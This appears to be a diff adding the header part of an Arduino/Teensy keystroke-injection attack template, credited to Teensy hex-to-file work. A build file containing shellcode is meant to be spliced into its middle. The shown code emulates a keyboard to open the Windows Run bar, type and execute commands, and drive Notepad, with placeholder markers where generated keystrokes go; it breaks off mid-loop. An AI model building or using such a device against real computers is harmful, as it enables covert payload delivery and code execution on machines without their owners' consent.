@@ -1,0 +1,75 @@
+/* Adapted from the Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)*/
+/* Ardunino code split into header and tail with xml csharp build file containing shellcode inserted into the middle by Mike Judge*/
+#include <avr/pgmspace.h>
+
+char buffer[55];
+int ledPin = 11;
+
+void BlinkFast(int BlinkRate)
+  {
+    int BlinkCounter=0;
+    for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++)
+      {
+        digitalWrite(ledPin, HIGH);
+        delay(80);
+        digitalWrite(ledPin, LOW);
+        delay(80);
+      }
+  }
+
+void AltF4()
+  {
+    Keyboard.set_modifier(MODIFIERKEY_ALT);
+    Keyboard.set_key1(KEY_F4);
+    Keyboard.send_now();
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+  }
+
+void CtrlS()
+  {
+    Keyboard.set_modifier(MODIFIERKEY_CTRL);
+    Keyboard.set_key1(KEY_S);
+    Keyboard.send_now();
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+  }
+
+// Taken from IronGeek
+void CommandAtRunBar(char *SomeCommand)
+  {
+    Keyboard.set_modifier(128);
+    Keyboard.set_key1(KEY_R);
+    Keyboard.send_now();
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+    delay(1500);
+    Keyboard.print(SomeCommand);
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+  }
+
+void setup()
+  {
+    pinMode(ledPin, OUTPUT);
+  }
+
+void loop()
+  {
+  /*  BlinkFast(2); */
+  delay(10000);
+-----create-----
+  delay(750);
+-----notepad-----
+  delay(1000);
+  // Delete the 0 from the file
+  Keyboard.set_key1(KEY_DELETE);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(2000);
